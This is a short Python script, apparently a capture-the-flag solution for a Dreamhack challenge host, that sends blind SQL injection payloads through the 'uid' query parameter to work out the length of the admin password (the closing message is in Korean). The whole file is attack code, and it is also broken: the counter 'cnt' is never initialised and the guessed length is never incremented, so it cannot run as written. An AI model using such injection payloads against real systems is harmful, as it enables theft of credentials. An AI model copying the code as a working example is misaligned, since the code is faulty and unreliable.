import requests

url = "http://host8.dreamhack.games:8825/"

passwdL=0
while(True):
    cnt+=1
    param={
        'uid':f"'||(length(upw))like({passwdL})#"
    }
    print(f'try{cnt}')
    if 'admin' in requests.get(url,params=param).text:
        break

print(f"비밀번호 길이는 = {passwdL}")
